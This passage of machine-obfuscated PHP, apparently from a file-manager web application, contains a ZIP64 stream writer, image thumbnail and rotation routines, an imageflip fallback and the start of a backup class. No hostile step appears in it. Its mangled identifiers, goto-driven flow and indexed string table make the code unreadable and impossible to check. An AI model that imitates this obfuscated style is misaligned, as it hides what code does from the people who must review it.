$Fİ‚Ç×±¯, $EŒíì‰ê‹Š); } private function addToCdr($B‘‰Ûçä¤Œ, $bºŒ§ï†äé, $b“‘áÏñ¿, $f«İš³˜‚‘, $fÒ–›Áç, $D–Àø¹’Š) { $this->files[] = array($B‘‰Ûçä¤Œ, $bºŒ§ï†äé, $b“‘áÏñ¿, $f«İš³˜‚‘, $fÒ–›Áç, $this->ofs); $this->ofs += $D–Àø¹’Š; } protected function addCdrFile($eÁÌÕÕÜÌè) { goto EÈãÁî™¦Å; F»éÉŞô¤ì: $F´˜™œ = $this->dosTime(time()); $D»À­¼¦ù = array(array($eèˆ÷‡ø²[2035], static::CDR_FILE_SIGNATURE), array($eèˆ÷‡ø²[2036], static::ZIP_VERSION_64), array($eèˆ÷‡ø²[2036], static::ZIP_VERSION_64), array($eèˆ÷‡ø²[2036], 8), array($eèˆ÷‡ø²[2036], $C‹‘´—›), array($eèˆ÷‡ø²[2035], $F´˜™œ), array($eèˆ÷‡ø²[2035], $dĞ³™ëµ), array($eèˆ÷‡ø²[2035], 4294967295), array($eèˆ÷‡ø²[2035], 4294967295), array($eèˆ÷‡ø²[2036], strlen($AŒ¤ÚÍ)), array($eèˆ÷‡ø²[2036], 32), array($eèˆ÷‡ø²[2036], strlen($CƒáªĞ©)), array($eèˆ÷‡ø²[2036], 0), array($eèˆ÷‡ø²[2036], 0), array($eèˆ÷‡ø²[2035], 32), array($eèˆ÷‡ø²[2035], 4294967295)); $cÎ¥µÜÑ‰ = array(array($eèˆ÷‡ø²[2036], 1), array($eèˆ÷‡ø²[2036], 28), array($eèˆ÷‡ø²[2037], $DÁ¢¶¯Çô”), array($eèˆ÷‡ø²[2037], $aÓ¦à—¤Ç…), array($eèˆ÷‡ø²[2037], $bƒåŸççğÇ), array($eèˆ÷‡ø²[2035], 0)); goto d„Ñš†Ñ; d„Ñš†Ñ: $a‹ôÑ­¢¾ = $this->packFields($D»À­¼¦ù); $Cˆ‰±¨À¥½ = $this->packFields($cÎ¥µÜÑ‰); $f¬Æ¡À‰Í¡ = $a‹ôÑ­¢¾ . $AŒ¤ÚÍ . $CƒáªĞ© . $Cˆ‰±¨À¥½; goto bõôšãÏŒ÷; bõôšãÏŒ÷: $this->send($f¬Æ¡À‰Í¡); $this->cdr_ofs += strlen($f¬Æ¡À‰Í¡); goto e¡ÈƒÖÂ»—; EÈãÁî™¦Å: $eèˆ÷‡ø² =& $_SERVER[ã®Â„Éæ¹¤]; list($AŒ¤ÚÍ, $C‹‘´—›, $dĞ³™ëµ, $aÓ¦à—¤Ç…, $DÁ¢¶¯Çô”, $bƒåŸççğÇ) = $eÁÌÕÕÜÌè; $CƒáªĞ© = $eèˆ÷‡ø²[33]; goto F»éÉŞô¤ì; e¡ÈƒÖÂ»—: } protected function addCdr64Eof() { goto E¿ã‚ï¤“ì; dñ³ƒ‘¥Ö¢: $e¾«èæøÎµ = $this->ofs; $a÷ñŞç´×‹ = array(array($Få·î›íèâ[2035], static::ZIP64_CDR_EOF_SIGNATURE), array($Få·î›íèâ[2037], 44), array($Få·î›íèâ[2036], static::ZIP_VERSION_64), array($Få·î›íèâ[2036], static::ZIP_VERSION_64), array($Få·î›íèâ[2035], 0), array($Få·î›íèâ[2035], 0), array($Få·î›íèâ[2037], $cÌ…—Úî´ê), array($Få·î›íèâ[2037], $cÌ…—Úî´ê), array($Få·î›íèâ[2037], $CáÏ¿ƒòÍ), array($Få·î›íèâ[2037], $e¾«èæøÎµ)); $Eà‚˜›Œ£ = $this->packFields($a÷ñŞç´×‹); goto AÂÛ·Û‹«’; AÂÛ·Û‹«’: $this->send($Eà‚˜›Œ£); goto aÅ§ÖàÔíé; E¿ã‚ï¤“ì: $Få·î›íèâ =& $_SERVER[ã®Â„Éæ¹¤]; $cÌ…—Úî´ê = count($this->files); $CáÏ¿ƒòÍ = $this->cdr_ofs; goto dñ³ƒ‘¥Ö¢; aÅ§ÖàÔíé: } protected function addCdr64Locator() { goto B„»ÅİñÆ; B„»ÅİñÆ: $AªàÜÊÙ¬ =& $_SERVER[ã®Â„Éæ¹¤]; $Fö…±ëä = count($this->files); $AÌÚ¸¶è„¹ = $this->cdr_ofs; goto cé»ÇÅÏ·«; cé»ÇÅÏ·«: $C¹²¿ÁóÃ = $this->ofs; $Aƒ—¸†ËÚ– = array(array($AªàÜÊÙ¬[2035], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($AªàÜÊÙ¬[2035], 0), array($AªàÜÊÙ¬[2037], $C¹²¿ÁóÃ + $AÌÚ¸¶è„¹), array($AªàÜÊÙ¬[2035], 1)); $aäíâ†Éƒ­ = $this->packFields($Aƒ—¸†ËÚ–); goto fîÓ²Š›‡â; fîÓ²Š›‡â: $this->send($aäíâ†Éƒ­); goto CĞù²…Ü¿ª; CĞù²…Ü¿ª: } protected function addCdrEof() { goto EƒŒìµËš; D¤¨ä›Ÿù: $A†¡ÈŠÃãÊ = $this->ofs; $a ˆïœùâÖ = $FÇ­»ÛÙŠê[33]; $BÒ¥¨©÷‡ = array(array($FÇ­»ÛÙŠê[2035], static::CDR_EOF_SIGNATURE), array($FÇ­»ÛÙŠê[2036], 0), array($FÇ­»ÛÙŠê[2036], 0), array($FÇ­»ÛÙŠê[2036], $c¥®éÓ³), array($FÇ­»ÛÙŠê[2036], $c¥®éÓ³), array($FÇ­»ÛÙŠê[2035], 4294967295), array($FÇ­»ÛÙŠê[2035], 4294967295), array($FÇ­»ÛÙŠê[2036], strlen($a ˆïœùâÖ))); goto AñŸ¯Š¸´; EƒŒìµËš: $FÇ­»ÛÙŠê =& $_SERVER[ã®Â„Éæ¹¤]; $c¥®éÓ³ = count($this->files); $b«·™÷®åÙ = $this->cdr_ofs; goto D¤¨ä›Ÿù; AñŸ¯Š¸´: $e¤•Íà†åå = $this->packFields($BÒ¥¨©÷‡) . $a ˆïœùâÖ; $this->send($e¤•Íà†åå); goto cßó¡˜¸÷Æ; cßó¡˜¸÷Æ: } protected function addCdr() { foreach ($this->files as $a¥‹Áòçæõ) { $this->addCdrFile($a¥‹Áòçæõ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $FÄ‚ŞŠ½±á =& $_SERVER[ã®Â„Éæ¹¤]; $f…·Ó‚ŸîŠ = $FÄ‚ŞŠ½±á[202]; if ($this->outputName) { $cÓ½§‡Ñ¬Ë = trim(str_replace(array($FÄ‚ŞŠ½±á[113], $FÄ‚ŞŠ½±á[55], $FÄ‚ŞŠ½±á[93], $FÄ‚ŞŠ½±á[67], $FÄ‚ŞŠ½±á[217], $FÄ‚ŞŠ½±á[1011]), $FÄ‚ŞŠ½±á[33], $this->outputName)); $AÌÜÖÚ§¦© = rawurlencode($cÓ½§‡Ñ¬Ë); $f…·Ó‚ŸîŠ .= "\x3b\40\x66\151\x6c\145\156\141\155\145\x2a\75\165\x74\146\x2d\x38\47\47{$AÌÜÖÚ§¦©}"; } $eöˆˆ¨é¯¼ = array($FÄ‚ŞŠ½±á[199] => $FÄ‚ŞŠ½±á[2038], $FÄ‚ŞŠ½±á[2039] => $f…·Ó‚ŸîŠ, $FÄ‚ŞŠ½±á[2040] => $FÄ‚ŞŠ½±á[2041], $FÄ‚ŞŠ½±á[2042] => $FÄ‚ŞŠ½±á[2043], $FÄ‚ŞŠ½±á[2044] => $FÄ‚ŞŠ½±á[2045]); foreach ($eöˆˆ¨é¯¼ as $f„‚«…‹œ => $bÖÓ„øÔ) { header($f„‚«…‹œ . $FÄ‚ŞŠ½±á[898] . $bÖÓ„øÔ); } } protected function send($eÅ°„¼‚ÍÑ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $eÅ°„¼‚ÍÑ); } protected final function dosTime($eÆ±Õ­é’Ğ) { $F‹«“à¯åÅ =& $_SERVER[ã®Â„Éæ¹¤]; $BÄ…‡äÃÍ† = getdate($eÆ±Õ­é’Ğ); if ($BÄ…‡äÃÍ†[$F‹«“à¯åÅ[1745]] < 1980) { $BÄ…‡äÃÍ† = array($F‹«“à¯åÅ[1745] => 1980, $F‹«“à¯åÅ[2046] => 1, $F‹«“à¯åÅ[2047] => 1, $F‹«“à¯åÅ[2048] => 0, $F‹«“à¯åÅ[2049] => 0, $F‹«“à¯åÅ[2050] => 0); } $BÄ…‡äÃÍ†[$F‹«“à¯åÅ[1745]] -= 1980; return $BÄ…‡äÃÍ†[$F‹«“à¯åÅ[1745]] << 25 | $BÄ…‡äÃÍ†[$F‹«“à¯åÅ[2046]] << 21 | $BÄ…‡äÃÍ†[$F‹«“à¯åÅ[2047]] << 16 | $BÄ…‡äÃÍ†[$F‹«“à¯åÅ[2048]] << 11 | $BÄ…‡äÃÍ†[$F‹«“à¯åÅ[2049]] << 5 | $BÄ…‡äÃÍ†[$F‹«“à¯åÅ[2050]] >> 1; } protected function packFields($Cë÷œ†á…Ë) { $F´£ïğÑŠ =& $_SERVER[ã®Â„Éæ¹¤]; $EˆËÕ¶‡ë = $F´£ïğÑŠ[33]; $a»å»š¸ = array(); foreach ($Cë÷œ†á…Ë as $e¡Û½ùå¥š) { $EˆËÕ¶‡ë .= $e¡Û½ùå¥š[0]; $a»å»š¸[] = $e¡Û½ùå¥š[1]; } array_unshift($a»å»š¸, $EˆËÕ¶‡ë); return call_user_func_array($F´£ïğÑŠ[2051], $a»å»š¸); } protected function filterFilename($AŠŸœÊÓõá) { $E„ÏìŠ¹½’ =& $_SERVER[ã®Â„Éæ¹¤]; return str_replace(array($E„ÏìŠ¹½’[93], $E„ÏìŠ¹½’[4], $E„ÏìŠ¹½’[176], $E„ÏìŠ¹½’[69], $E„ÏìŠ¹½’[113], $E„ÏìŠ¹½’[943], $E„ÏìŠ¹½’[946], $E„ÏìŠ¹½’[271]), $E„ÏìŠ¹½’[70], $AŠŸœÊÓõá); } } class ZipStream { } goto Bß×Ï¸Éæ; f‡·ì”ÛëÆ: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($cÄÜæ¿Ëœ, $aä®¾ƒá£Ã) { goto Ağ¿‹–ØÒ¬; DÊğ¨çù½: if (!$this->im) { return !1; } $CéÎÆ­â‚ = $_SERVER[ã®Â„Éæ¹¤][33]; $this->imgData = GetImageSize($cÄÜæ¿Ëœ, $CéÎÆ­â‚); goto b‘Œ™ÃÎŠ»; Ağ¿‹–ØÒ¬: $this->srcFile = $cÄÜæ¿Ëœ; $this->echoType = $aä®¾ƒá£Ã; $this->im = self::image($cÄÜæ¿Ëœ); goto DÊğ¨çù½; b‘Œ™ÃÎŠ»: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto cŠğÎÖì’; cŠğÎÖì’: } public static function image($FÄ£ĞİÈ·å) { $FŞ•¾îÊîĞ =& $_SERVER[ã®Â„Éæ¹¤]; $A®‡Ò¬£Úù = $FŞ•¾îÊîĞ[33]; $a©°Œ—œÂ = GetImageSize($FÄ£ĞİÈ·å, $A®‡Ò¬£Úù); $AŠ‰½§Òç = !1; switch ($a©°Œ—œÂ[2]) { case IMAGETYPE_GIF: if (!function_exists($FŞ•¾îÊîĞ[1884])) { break; } $AŠ‰½§Òç = imagecreatefromgif($FÄ£ĞİÈ·å); break; case IMAGETYPE_JPEG: if (!function_exists($FŞ•¾îÊîĞ[1885])) { break; } $AŠ‰½§Òç = imagecreatefromjpeg($FÄ£ĞİÈ·å); break; case IMAGETYPE_PNG: if (!function_exists($FŞ•¾îÊîĞ[1886])) { break; } $AŠ‰½§Òç = @imagecreatefrompng($FÄ£ĞİÈ·å); imagesavealpha($AŠ‰½§Òç, !0); break; case IMAGETYPE_XBM: $AŠ‰½§Òç = imagecreatefromxbm($FÄ£ĞİÈ·å); break; case IMAGETYPE_WBMP: $AŠ‰½§Òç = imagecreatefromwbmp($FÄ£ĞİÈ·å); break; case IMAGETYPE_BMP: $AŠ‰½§Òç = imagecreatefrombmp($FÄ£ĞİÈ·å); break; default: break; } return $AŠ‰½§Òç; } public static function imageSize($eÖÓÛ¾Ç¼) { $d…Íó¦ù¥¿ =& $_SERVER[ã®Â„Éæ¹¤]; $aİˆ¾¢Ü°Û = GetImageSize($eÖÓÛ¾Ç¼); if (!$aİˆ¾¢Ü°Û) { return !1; } return array($d…Íó¦ù¥¿[1887] => $aİˆ¾¢Ü°Û[0], $d…Íó¦ù¥¿[1888] => $aİˆ¾¢Ü°Û[1]); } function distortion($EÑÑ¤…Šš, $B¥óøÔ½Ñ², $d˜Ò™›§Ğ¤) { $fâ¦ˆ•·øï = $this->creatImage($this->im, $B¥óøÔ½Ñ², $d˜Ò™›§Ğ¤, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($fâ¦ˆ•·øï, $EÑÑ¤…Šš); } function prorate($E¥® §Úå, $E­ôÙÔòè³, $AŒ‰ßïõù™) { $e¦™ğ‚ÜŠõ = $E­ôÙÔòè³ / $AŒ‰ßïõù™; $eÎ›¹âİê = $this->srcW / $this->srcH; if ($e¦™ğ‚ÜŠõ <= $eÎ›¹âİê) { $c½ÌÎ‰šÏ¢ = $E­ôÙÔòè³; $cÔƒñ‹àÊ = $c½ÌÎ‰šÏ¢ * ($this->srcH / $this->srcW); } else { $cÔƒñ‹àÊ = $AŒ‰ßïõù™; $c½ÌÎ‰šÏ¢ = $cÔƒñ‹àÊ * ($this->srcW / $this->srcH); } if ($this->srcW > $E­ôÙÔòè³ || $this->srcH > $AŒ‰ßïõù™) { $d»ÕêòØ™ = $this->creatImage($this->im, $c½ÌÎ‰šÏ¢, $cÔƒñ‹àÊ, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $d»ÕêòØ™ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $d»ÕêòØ™ = $this->autoRotate($d»ÕêòØ™); return $this->echoImage($d»ÕêòØ™, $E¥® §Úå); } private function autoRotate($c¬‘•ÈÌÕ£) { goto fÒØ’‰‚§é; fÒØ’‰‚§é: $dÂ×²éÁ©² =& $_SERVER[ã®Â„Éæ¹¤]; if (!$c¬‘•ÈÌÕ£ || !function_exists($dÂ×²éÁ©²[1889])) { return $c¬‘•ÈÌÕ£; } $EÄ˜ï»îó = exif_read_data($this->srcFile); goto AÊáòÑÇ–ˆ; eå¥ßçÍß: if ($EÄ˜ï»îó[$dÂ×²éÁ©²[1890]] == 8) { $EŠËªªÈÒ = 270; } if ($EÄ˜ï»îó[$dÂ×²éÁ©²[1890]] == 3) { $EŠËªªÈÒ = 180; } return $this->rotateDegree($c¬‘•ÈÌÕ£, $EŠËªªÈÒ); goto e˜°ƒñ×Ä£; AÊáòÑÇ–ˆ: if (!$EÄ˜ï»îó || !isset($EÄ˜ï»îó[$dÂ×²éÁ©²[1890]]) || $EÄ˜ï»îó[$dÂ×²éÁ©²[1890]] == 1) { return $c¬‘•ÈÌÕ£; } $EŠËªªÈÒ = 0; if ($EÄ˜ï»îó[$dÂ×²éÁ©²[1890]] == 6) { $EŠËªªÈÒ = 90; } goto eå¥ßçÍß; e˜°ƒñ×Ä£: } private function rotateDegree($Fº÷¿œÛ, $fÎ•²›†Ù“) { if (!$Fº÷¿œÛ || $fÎ•²›†Ù“ % 360 === 0 || !function_exists($_SERVER[ã®Â„Éæ¹¤][1891])) { return $Fº÷¿œÛ; } $cÃòòíä’’ = imageRotate($Fº÷¿œÛ, 360 - $fÎ•²›†Ù“, 0); imageDestroy($Fº÷¿œÛ); return $cÃòòíä’’ ? $cÃòòíä’’ : $Fº÷¿œÛ; } function cut($d¤·«çˆÖ, $CóÓ¯”Ø³İ, $eóôğ¹‚®¯) { goto bŞ¥é”†²; aèì è¢¨: $E–à±ø®™ = $this->creatImage($this->im, $FÏÓç¡œé½, $bÄÙËÏ„»ê, 0, 0, 0, 0, $this->srcW, $this->srcH); $Fë‰Æ‚‹Á = $this->creatImage($E–à±ø®™, $CóÓ¯”Ø³İ, $eóôğ¹‚®¯, 0, 0, ($FÏÓç¡œé½ - $CóÓ¯”Ø³İ) / 2, ($bÄÙËÏ„»ê - $eóôğ¹‚®¯) / 2, $CóÓ¯”Ø³İ, $eóôğ¹‚®¯); imageDestroy($E–à±ø®™); goto d•´ÀÂƒÉ; bŞ¥é”†²: $bî„—Óİå™ = $CóÓ¯”Ø³İ / $eóôğ¹‚®¯; $aŠÄ×¹‡æ‡ = $this->srcW / $this->srcH; if ($bî„—Óİå™ <= $aŠÄ×¹‡æ‡) { $bÄÙËÏ„»ê = $eóôğ¹‚®¯; $FÏÓç¡œé½ = $bÄÙËÏ„»ê * ($this->srcW / $this->srcH); } else { $FÏÓç¡œé½ = $CóÓ¯”Ø³İ; $bÄÙËÏ„»ê = $FÏÓç¡œé½ * ($this->srcH / $this->srcW); } goto aèì è¢¨; d•´ÀÂƒÉ: return $this->echoImage($Fë‰Æ‚‹Á, $d¤·«çˆÖ); goto E“•÷Öâ‚«; E“•÷Öâ‚«: } function backFill($Bº¯éêÚ¦, $cÅ´‰¾³·ä, $béØÇ¹Õ»Ğ, $bÏèê‘´è˜ = false, $DŠ†°ğÀ³Œ = 255, $EÀÍºƒ = 255, $aÍ‚ø‘İÍª = 255) { goto D™¦«ÜÛ; cäÊ»›‚ßİ: return $this->echoImage($dÅ°¶ÑŠ½, $Bº¯éêÚ¦); goto e“§”àƒ¨; D«ˆÄôˆØ´: if (function_exists($_SERVER[ã®Â„Éæ¹¤][1892])) { @($dÅ°¶ÑŠ½ = imageCreateTrueColor($cÅ´‰¾³·ä, $béØÇ¹Õ»Ğ)); if (!$dÅ°¶ÑŠ½) { $dÅ°¶ÑŠ½ = imageCreate($cÅ´‰¾³·ä, $béØÇ¹Õ»Ğ); } } else { $dÅ°¶ÑŠ½ = imageCreate($cÅ´‰¾³·ä, $béØÇ¹Õ»Ğ); } $cĞ¼«ëªĞ = ($béØÇ¹Õ»Ğ - $Aó‚‰‚è¤ô) / 2; $EÈ˜Œ“ßÖ¡ = imagecolorallocate($dÅ°¶ÑŠ½, $DŠ†°ğÀ³Œ, $EÀÍºƒ, $aÍ‚ø‘İÍª); goto fÁ¶²±‰; D™¦«ÜÛ: $cîÈô©’‚‘ = $cÅ´‰¾³·ä / $béØÇ¹Õ»Ğ; $DÌÃ¢¯‹‘± = $this->srcW / $this->srcH; if ($cîÈô©’‚‘ <= $DÌÃ¢¯‹‘±) { $cÅ¸Ä”‡„§ = $cÅ´‰¾³·ä; $Aó‚‰‚è¤ô = $cÅ¸Ä”‡„§ * ($this->srcH / $this->srcW); } else { $Aó‚‰‚è¤ô = $béØÇ¹Õ»Ğ; $cÅ¸Ä”‡„§ = $Aó‚‰‚è¤ô * ($this->srcW / $this->srcH); } goto D«ˆÄôˆØ´; fÁ¶²±‰: if ($bÏèê‘´è˜) { $EÈ˜Œ“ßÖ¡ = imageColorTransparent($dÅ°¶ÑŠ½, $EÈ˜Œ“ßÖ¡); $cĞ¼«ëªĞ = $béØÇ¹Õ»Ğ - $Aó‚‰‚è¤ô; } imageFilledRectangle($dÅ°¶ÑŠ½, 0, 0, $cÅ´‰¾³·ä, $béØÇ¹Õ»Ğ, $EÈ˜Œ“ßÖ¡); if ($this->srcW > $cÅ´‰¾³·ä || $this->srcH > $béØÇ¹Õ»Ğ) { $A†¿¥çğæ = $this->creatImage($this->im, $cÅ¸Ä”‡„§, $Aó‚‰‚è¤ô, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($cÅ¸Ä”‡„§ < $cÅ´‰¾³·ä) { imageCopy($dÅ°¶ÑŠ½, $A†¿¥çğæ, ($cÅ´‰¾³·ä - $cÅ¸Ä”‡„§) / 2, 0, 0, 0, $cÅ¸Ä”‡„§, $Aó‚‰‚è¤ô); } else { if ($Aó‚‰‚è¤ô < $béØÇ¹Õ»Ğ) { imageCopy($dÅ°¶ÑŠ½, $A†¿¥çğæ, 0, $cĞ¼«ëªĞ, 0, 0, $cÅ¸Ä”‡„§, $Aó‚‰‚è¤ô); } else { imageCopy($dÅ°¶ÑŠ½, $A†¿¥çğæ, 0, 0, 0, 0, $cÅ¸Ä”‡„§, $Aó‚‰‚è¤ô); } } } else { imageCopyMerge($dÅ°¶ÑŠ½, $this->im, ($cÅ´‰¾³·ä - $cÅ¸Ä”‡„§) / 2, $cĞ¼«ëªĞ, 0, 0, $cÅ¸Ä”‡„§, $Aó‚‰‚è¤ô, 100); } goto cäÊ»›‚ßİ; e“§”àƒ¨: } function creatImage($dŞØˆØ‚öá, $aåòé„†›÷, $B¢Òå®ôÃø, $d¡Åä“È‰«, $e„„¶ç×£‘, $Då±ã¯®ˆÈ, $E±Ç˜‘™Á, $dµÊöĞùÊç, $dÇŠÚ­·‘Œ) { if (function_exists($_SERVER[ã®Â„Éæ¹¤][1892])) { @($e•Ü—ŸÏé­ = ImageCreateTrueColor($aåòé„†›÷, $B¢Òå®ôÃø)); @imagealphablending($e•Ü—ŸÏé­, !1); @imagesavealpha($e•Ü—ŸÏé­, !0); if ($e•Ü—ŸÏé­) { imageCopyResampled($e•Ü—ŸÏé­, $dŞØˆØ‚öá, $d¡Åä“È‰«, $e„„¶ç×£‘, $Då±ã¯®ˆÈ, $E±Ç˜‘™Á, $aåòé„†›÷, $B¢Òå®ôÃø, $dµÊöĞùÊç, $dÇŠÚ­·‘Œ); } else { $e•Ü—ŸÏé­ = ImageCreate($aåòé„†›÷, $B¢Òå®ôÃø); imageCopyResized($e•Ü—ŸÏé­, $dŞØˆØ‚öá, $d¡Åä“È‰«, $e„„¶ç×£‘, $Då±ã¯®ˆÈ, $E±Ç˜‘™Á, $aåòé„†›÷, $B¢Òå®ôÃø, $dµÊöĞùÊç, $dÇŠÚ­·‘Œ); } } else { $e•Ü—ŸÏé­ = ImageCreate($aåòé„†›÷, $B¢Òå®ôÃø); imageCopyResized($e•Ü—ŸÏé­, $dŞØˆØ‚öá, $d¡Åä“È‰«, $e„„¶ç×£‘, $Då±ã¯®ˆÈ, $E±Ç˜‘™Á, $aåòé„†›÷, $B¢Òå®ôÃø, $dµÊöĞùÊç, $dÇŠÚ­·‘Œ); } return $e•Ü—ŸÏé­; } public function imgRotate($fÄ¨ù«Ğ, $CƒÒÏ÷ğç‹) { goto EÎŞØÕ´±ì; EÎŞØÕ´±ì: if (!$this->im || $CƒÒÏ÷ğç‹ % 360 === 0 || !function_exists($_SERVER[ã®Â„Éæ¹¤][1891])) { return !1; } $CÉ«ãº§ = imageRotate($this->im, 360 - $CƒÒÏ÷ğç‹, 0); $bŞ¥Ï„¶Ó = !1; goto aÕÇ»åÃË; aÕÇ»åÃË: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $bŞ¥Ï„¶Ó = imagegif($CÉ«ãº§, $fÄ¨ù«Ğ); break; case IMAGETYPE_JPEG: $bŞ¥Ï„¶Ó = imagejpeg($CÉ«ãº§, $fÄ¨ù«Ğ, 100); break; case IMAGETYPE_PNG: $bŞ¥Ï„¶Ó = imagePNG($CÉ«ãº§, $fÄ¨ù«Ğ); break; default: break; } imageDestroy($CÉ«ãº§); imageDestroy($this->im); goto d”÷ç‚¶šè; d”÷ç‚¶šè: return $bŞ¥Ï„¶Ó; goto CÇÜœ¦ƒ‡; CÇÜœ¦ƒ‡: } function echoImage($B¥ĞÖ‹·î™, $D‰ò›•¬Ê½) { goto d†ªòñÈŸ; AŒŠ¡ô‘Ó„: imageDestroy($this->im); return $Eö©‘“²îæ; goto b«Ò•½Š–î; d†ªòñÈŸ: $CßÊÔ…¸…¤ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$B¥ĞÖ‹·î™) { return !1; } ob_get_clean(); goto FÈ¨©±ö; FÈ¨©±ö: $Eö©‘“²îæ = !1; switch ($this->echoType) { case $CßÊÔ…¸…¤[1893]: $Eö©‘“²îæ = imagePNG($B¥ĞÖ‹·î™); break; case $CßÊÔ…¸…¤[167]: $Eö©‘“²îæ = imagePNG($B¥ĞÖ‹·î™, $D‰ò›•¬Ê½); break; } imageDestroy($B¥ĞÖ‹·î™); goto AŒŠ¡ô‘Ó„; b«Ò•½Š–î: } } if (!function_exists($_SERVER[ã®Â„Éæ¹¤][1894])) { define($_SERVER[ã®Â„Éæ¹¤][1895], 0); define($_SERVER[ã®Â„Éæ¹¤][1896], 1); define($_SERVER[ã®Â„Éæ¹¤][1897], 2); function imageflip($B³àåøˆ©Ô, $fÍŞ¼Å¶½) { switch ($fÍŞ¼Å¶½) { case IMG_FLIP_HORIZONTAL: $e‘Ë¥ƒÌ¹Ğ = imagesx($B³àåøˆ©Ô) - 1; $BÏ¶¢¸ÜóŞ = $e‘Ë¥ƒÌ¹Ğ / 2; $aÏ‚Öß‡ô‘ = imagesy($B³àåøˆ©Ô); $a„–„†¨Ô· = imageistruecolor($B³àåøˆ©Ô) ? imagecreatetruecolor(1, $aÏ‚Öß‡ô‘) : imagecreate(1, $aÏ‚Öß‡ô‘); for ($EêÕœÍ¾ÀÈ = 0; $EêÕœÍ¾ÀÈ < $BÏ¶¢¸ÜóŞ; ++$EêÕœÍ¾ÀÈ) { imagecopy($a„–„†¨Ô·, $B³àåøˆ©Ô, 0, 0, $EêÕœÍ¾ÀÈ, 0, 1, $aÏ‚Öß‡ô‘); imagecopy($B³àåøˆ©Ô, $B³àåøˆ©Ô, $EêÕœÍ¾ÀÈ, 0, $e‘Ë¥ƒÌ¹Ğ - $EêÕœÍ¾ÀÈ, 0, 1, $aÏ‚Öß‡ô‘); imagecopy($B³àåøˆ©Ô, $a„–„†¨Ô·, $e‘Ë¥ƒÌ¹Ğ - $EêÕœÍ¾ÀÈ, 0, 0, 0, 1, $aÏ‚Öß‡ô‘); } break; case IMG_FLIP_VERTICAL: $Cñà•ÈÔŠ = imagesx($B³àåøˆ©Ô); $bŞÔÁ›¶›” = imagesy($B³àåøˆ©Ô) - 1; $BßÕ¥‹®ŞŠ = $bŞÔÁ›¶›” / 2; $a„–„†¨Ô· = imageistruecolor($B³àåøˆ©Ô) ? imagecreatetruecolor($Cñà•ÈÔŠ, 1) : imagecreate($Cñà•ÈÔŠ, 1); for ($b¹‘Å™¿Œ = 0; $b¹‘Å™¿Œ < $BßÕ¥‹®ŞŠ; ++$b¹‘Å™¿Œ) { imagecopy($a„–„†¨Ô·, $B³àåøˆ©Ô, 0, 0, 0, $b¹‘Å™¿Œ, $Cñà•ÈÔŠ, 1); imagecopy($B³àåøˆ©Ô, $B³àåøˆ©Ô, 0, $b¹‘Å™¿Œ, 0, $bŞÔÁ›¶›” - $b¹‘Å™¿Œ, $Cñà•ÈÔŠ, 1); imagecopy($B³àåøˆ©Ô, $a„–„†¨Ô·, 0, $bŞÔÁ›¶›” - $b¹‘Å™¿Œ, 0, 0, $Cñà•ÈÔŠ, 1); } break; case IMG_FLIP_BOTH: $Cñà•ÈÔŠ = imagesx($B³àåøˆ©Ô); $aÏ‚Öß‡ô‘ = imagesy($B³àåøˆ©Ô); $a„–„†¨Ô· = imagerotate($B³àåøˆ©Ô, 180, 0); imagecopy($B³àåøˆ©Ô, $a„–„†¨Ô·, 0, 0, 0, 0, $Cñà•ÈÔŠ, $aÏ‚Öß‡ô‘); break; default: return; } imagedestroy($a„–„†¨Ô·); } } if (!function_exists($_SERVER[ã®Â„Éæ¹¤][1898])) { function imagecreatefrombmp($c¾¢ó”Ìµ) { return ImageGdBMP::load($c¾¢ó”Ìµ); } } goto e¿ùÇ¶Ùä¦; Fç¾ñ‡©Â†: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $AÛÌî­Š°å =& $_SERVER[ã®Â„Éæ¹¤]; self::$name = date($AÛÌî­Š°å[709]); if (!($DÄ¸Í³ÄÒ‡ = Model($AÛÌî­Š°å[710])->lastItem())) { $DÄ¸Í³ÄÒ‡ = $this->initData(); } else { self::$name = $DÄ¸Í³ÄÒ‡[$AÛÌî­Š°å[28]]; if ($DÄ¸Í³ÄÒ‡[$AÛÌî­Š°å[711]] == $AÛÌî­Š°å[83]) { self::$name = date($AÛÌî­Š°å[712]); $a‡ßäİ½‘„ = 0; if (isset($DÄ¸Í³ÄÒ‡[$AÛÌî­Š°å[281]][$AÛÌî­Š°å[167]][$AÛÌî­Š°å[419]])) { $a‡ßäİ½‘„ = (int) $DÄ¸Í³ÄÒ‡[$AÛÌî­Š°å[281]][$AÛÌî­Š°å[167]][$AÛÌî­Š°å[419]]; } if ($DÄ¸Í³ÄÒ‡[$AÛÌî­Š°å[28]] == self::$name) { Model($AÛÌî­Š°å[710])->remove($DÄ¸Í³ÄÒ‡[$AÛÌî­Š°å[367]]); } $DÄ¸Í³ÄÒ‡ = $this->initData($a‡ßäİ½‘„, $DÄ¸Í³ÄÒ‡[$AÛÌî­Š°å[713]]); } else { $this->checkStore($DÄ¸Í³ÄÒ‡[$AÛÌî­Š°å[713]]); } } self::$option = $DÄ¸Í³ÄÒ‡; } private function initData($F³âøËœÄ™ = 0, $cèÒÍíØàŠ = '') { goto e¢„Š¼âòÅ; e¢„Š¼âòÅ: $bø¦Àøá·’ =& $_SERVER[ã®Â„Éæ¹¤]; $bÎ¶»¾Ÿ = Model($bø¦Àøá·’[710])->config(); if ($cèÒÍíØàŠ && $bÎ¶»¾Ÿ[$bø¦Àøá·’[713]] != $cèÒÍíØàŠ) { $F³âøËœÄ™ = 0; } goto CæÈàÃ…; a´ªÑŠÔºÒ: $a˜¾öå³‰[$bø¦Àøá·’[367]] = $dê™„‹µƒ; return $a˜¾öå³‰; goto aä¸¥®Ó Â; CæÈàÃ…: $this->checkStore($bÎ¶»¾Ÿ[$bø¦Àøá·’[713]]); $a˜¾öå³‰ = array($bø¦Àøá·’[713] => 